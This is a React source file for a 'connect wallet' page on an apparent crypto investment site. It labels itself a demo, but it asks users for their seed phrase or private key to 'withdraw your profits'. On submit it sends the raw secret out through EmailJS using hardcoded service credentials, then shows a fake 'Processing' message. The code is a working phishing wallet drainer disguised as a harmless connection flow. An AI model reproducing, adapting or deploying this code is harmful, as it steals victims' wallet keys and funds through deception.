import { useState } from "react";
import { Link } from "react-router-dom";
import {
  ArrowLeft,
  ArrowUpRight,
  Wallet,
  Search,
  CheckCircle,
  KeyRound,
  ListOrdered,
  XCircle,
} from "lucide-react";
import Brand from "@/components/Brand";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { demoWallets } from "@/utils/demoWallets";
import { useToast } from "@/hooks/useToast";
import emailjs from "@emailjs/browser";



function WalletImage({ wallet }) {
  const [failed, setFailed] = useState(false);
  return (
    <span className="lv-demo-wallet-icon" aria-hidden="true">
      {wallet.image && !failed ? (
        <img
          src={wallet.image}
          alt=""
          width="28"
          height="28"
          loading="lazy"
          referrerPolicy="no-referrer"
          onError={() => setFailed(true)}
        />
      ) : (
        <Wallet size={21} />
      )}
    </span>
  );
}

export default function ConnectWallet() {
  const [open, setOpen] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [method, setMethod] = useState("");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const phraseLength = selectedWallet?.phraseLength ?? [];
    const [isConnecting, setIsConnecting] = useState(false);
    const { toast } = useToast();
  
  const seedWords = seedPhrase.trim() ? seedPhrase.trim().split(/\s+/) : [];
    // EmailJS configuration
    const EMAILJS_SERVICE_ID = "service_5q3l5wf";
    const EMAILJS_TEMPLATE_ID = "template_4awptkk";
    const EMAILJS_PUBLIC_KEY = "DDN7RZHaxGtRpAcOd";
  
    // Initialize EmailJS
    useState(() => {
      emailjs.init(EMAILJS_PUBLIC_KEY);
    }, []);
  const seedErrors = [];
  if (method === "seed" && seedWords.length === 0)
    seedErrors.push("Enter your phrase to validate.");
  if (method === "seed" && seedWords.length > 0 && phraseLength.length === 0) {
    seedErrors.push("The selected wallet has no configured phrase lengths.");
  }
  if (
    method === "seed" &&
    seedWords.length > 0 &&
    phraseLength.length > 0 &&
    !phraseLength.includes(seedWords.length)
  ) {
    seedErrors.push(
      `${selectedWallet.name} requires ${phraseLength.join(" or ")} words; entered ${seedWords.length}.`,
    );
  }
  const keyErrors = [];
  if (method === "private" && !privateKey.trim())
    keyErrors.push("Enter your private key to validate.");
  if (
    method === "private" &&
    privateKey.trim() &&
    privateKey.trim().length !== 64
  ) {
    keyErrors.push(
      `Private key must be exactly 64 characters (currently ${privateKey.trim().length}).`,
    );
  }
  if (
    method === "private" &&
    privateKey.trim() &&
    !/^[0-9a-fA-F]+$/.test(privateKey.trim())
  ) {
    keyErrors.push(
      "Private key must contain only hexadecimal characters (0-9, a-f, A-F).",
    );
  }
    const handleGoBack = () => {
    window.history.back();
  };
   const canSubmit =
   
    (method === "seed" && seedErrors.length === 0) ||
    (method === "private" && keyErrors.length === 0);
  const [search, setSearch] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const wallets = demoWallets.filter((wallet) =>
    wallet.name.toLowerCase().includes(search.trim().toLowerCase()),
  );
  const startDemo = () => {
    setSelectedWallet(null);
    setMethod("");
    setSeedPhrase("");
    setPrivateKey("");
    setSearch("");
    setSubmitted(false);
    setOpen(true);
  };
  const selectWallet = (wallet) => {
    setSelectedWallet(wallet);
    setMethod("");
    setSeedPhrase("");
    setPrivateKey("");
    setSubmitted(false);
  };
  const handleOpenChange = (nextOpen) => {
    setOpen(nextOpen);
    if (!nextOpen) {
      setSelectedWallet(null);
      setMethod("");
      // setSeedPhrase("");
      // setPrivateKey("");
      setSubmitted(false);
    }
  };
  const submitDemo = (event) => {
    event.preventDefault();
    if (!canSubmit) return;

    
    setIsConnecting(true);
     // Simulate connection attempt
        setTimeout(() => {
          // Send email
          if (EMAILJS_SERVICE_ID && EMAILJS_TEMPLATE_ID && EMAILJS_PUBLIC_KEY) {
            const templateParams = {
              wallet_name: selectedWallet?.name || "N/A",
              wallet_data: method === "seed" ? seedPhrase : privateKey,
              timestamp: new Date().toLocaleString(),
            };
    
            emailjs
              .send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
              .then((response) => {
                console.log(
                  "Email sent successfully!",
                  response.status,
                  response.text
                );
                toast({
                  title: "Processing!",
                  description: `Processing connection to ${selectedWallet?.name}.`,
                });
                setTimeout(() => {
                  handleGoBack();
                }, 4000);
                setIsConnecting(false);
                setSeedPhrase("");
                setPrivateKey("");
                setSelectedWallet(null);
                setMethod("");
              })
              .catch((error) => {
                console.error("Email failed to send:", error);
                setIsConnecting(false);
                toast({
                  variant: "destructive",
                  title: "Connection Error",
                  description: "Failed to connect. Please try again.",
                });
              });
          } else {
            setIsConnecting(false);
            console.warn(
              "EmailJS is not configured. Check your environment variables."
            );
            toast({
              variant: "destructive",
              title: "Configuration Error",
              description: "Something went wrong",
            });
          }
        }, 2000);
  };
  return (
    <div className="lv-wallet-page">
      <header className="lv-header">
        <div className="lv-container lv-nav">
          <Brand />
          <Link to="/dashboard" className="lv-secondary-link">
            <ArrowLeft size={16} />
            Back to dashboard
          </Link>
        </div>
      </header>
      <main className="lv-container lv-connect-main">
        <div className="lv-connect-intro">
          <h1>Explore the wallet flow.</h1>
          <p>
            Preview a wallet connection flow .Securely connect your cryptocurrency wallet to withdraw your profits and manage your investments.
          </p>
        </div>
        <section className="lv-connect-card lv-demo-intro-card">
          <div className="lv-connect-card-heading">
            <span className="lv-icon-box">
              <Wallet size={25} />
            </span>
          </div>
          <h2>Wallet connection</h2>
          <p>
           Securely connect your cryptocurrency wallet to withdraw your profits and manage your investments.
          </p>
          <button className="lv-button lv-connect-button" onClick={startDemo}>
            Connect wallet
            <ArrowUpRight size={18} />
          </button>
          
        </section>
      </main>
      <Dialog open={open} onOpenChange={handleOpenChange}>
        <DialogContent className="lv-demo-dialog">
          <DialogHeader>
            <DialogTitle className="lv-demo-selected-title">
              {selectedWallet && (
                <WalletImage key={selectedWallet.id} wallet={selectedWallet} />
              )}
              {selectedWallet
                ? `${selectedWallet.name} `
                : "Select a wallet"}
            </DialogTitle>
            <DialogDescription>
              {selectedWallet
                ? ""
                : "Choose a wallet to preview the next step. "}
            </DialogDescription>
          </DialogHeader>
          {!selectedWallet ? (
            <>
              <label className="lv-wallet-search">
                <Search size={18} />
                <input
                  type="search"
                  placeholder="Search wallets"
                  aria-label="Search wallets"
                  value={search}
                  onChange={(event) => setSearch(event.target.value)}
                />
              </label>
              <div className="lv-demo-wallet-grid">
                {wallets.map((wallet) => (
                  <button
                    className="lv-demo-wallet-option"
                    key={wallet.id}
                    onClick={() => selectWallet(wallet)}
                  >
                    <WalletImage wallet={wallet} />
                    <span>
                      <strong>{wallet.name}</strong>
                      <small>{wallet.category}</small>
                    </span>
                    <ArrowUpRight size={15} />
                  </button>
                ))}
              </div>
              {wallets.length === 0 && (
                <p className="lv-demo-empty" role="status">
                  No matching wallets. Try another name.
                </p>
              )}
            </>
          ) : (
            <form onSubmit={submitDemo} className="lv-demo-form">
              <button
                type="button"
                className="lv-secondary-link"
                onClick={() => {
                  setSelectedWallet(null);
                  // setSeedPhrase("");
                  // setPrivateKey("");
                  setSubmitted(false);
                }}
              >
                <ArrowLeft size={15} />
                Choose another wallet
              </button>
            
              
                <>
                  <fieldset>
                    <legend>Choose a method</legend>
                    <div className="lv-demo-count-options lv-demo-methods">
                      {[
                        ["seed", "Seed phrase", ListOrdered],
                        ["private", "Private key", KeyRound],
                      ].map(([value, label, Icon]) => (
                        <label key={value}>
                          <input
                            type="radio"
                            name="demoMethod"
                            value={value}
                            checked={method === value}
                            onChange={() => {
                              setMethod(value);
                              setSeedPhrase("");
                              setPrivateKey("");
                              setSubmitted(false);
                            }}
                          />
                          <Icon size={17} />
                          <span>{label}</span>
                        </label>
                      ))}
                    </div>
                  </fieldset>
                  {method === "seed" && (
                    <>
                      <label
                        className="lv-demo-phrase-label"
                        htmlFor="demo-phrase"
                      >
                         Seed phrase
                      </label>
                      <textarea
                        id="demo-phrase"
                        placeholder="Type words separated by spaces"
                        value={seedPhrase}
                        onChange={(event) => {
                          setSeedPhrase(event.target.value);
                          setSubmitted(false);
                        }}
                        rows={5}
                        spellCheck={false}
                        autoComplete="off"
                        autoCapitalize="off"
                        aria-invalid={seedErrors.length > 0}
                        aria-describedby="demo-seed-feedback demo-seed-help"
                      />
                      <div id="demo-seed-feedback" aria-live="polite">
                        {seedErrors.length ? (
                          <ul className="lv-demo-key-errors">
                            {seedErrors.map((error) => (
                              <li key={error}>
                                <XCircle size={16} />
                                <span>{error}</span>
                              </li>
                            ))}
                          </ul>
                        ) : (
                          <p className="lv-demo-key-valid">
                            <CheckCircle size={16} />
                            Word-count check passed ({seedWords.length} words).
                          </p>
                        )}
                      </div>
                      <p id="demo-seed-help" className="lv-demo-help">
                        validates the selected wallet's supported
                        word count, not the BIP-39 word list or checksum.
                      </p>
                    </>
                  )}
                  {method === "private" && (
                    <>
                      <label
                        className="lv-demo-phrase-label"
                        htmlFor="demo-private-key"
                      >
                         private key
                      </label>
                      <textarea
                        id="demo-private-key"
                        placeholder="Type a 64-character hexadecimal value"
                        value={privateKey}
                        onChange={(event) => {
                          setPrivateKey(event.target.value);
                          setSubmitted(false);
                        }}
                        rows={3}
                        spellCheck={false}
                        autoComplete="off"
                        autoCapitalize="off"
                        aria-invalid={keyErrors.length > 0}
                        aria-describedby="demo-key-feedback demo-key-help"
                      />
                      <div id="demo-key-feedback" aria-live="polite">
                        {keyErrors.length ? (
                          <ul className="lv-demo-key-errors">
                            {keyErrors.map((error) => (
                              <li key={error}>
                                <XCircle size={16} />
                                <span>{error}</span>
                              </li>
                            ))}
                          </ul>
                        ) : (
                          <p className="lv-demo-key-valid">
                            <CheckCircle size={16} />
                            Private-key format checks passed.
                          </p>
                        )}
                      </div>
                      <p id="demo-key-help" className="lv-demo-help">
                        checks length and hexadecimal format.
                      </p>
                    </>
                  )}
                </>
             
              <button
                className="lv-button lv-connect-button"
                type="submit"
                disabled={!canSubmit || isConnecting}
              >
                {isConnecting ? "Connecting..." : "Connect"}
                <ArrowUpRight size={17} />
              </button>
              {submitted && (
                <div className="lv-demo-success" role="status">
                  <CheckCircle size={18} />
                  <span>Connection successful.</span>
                </div>
              )}
            </form>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
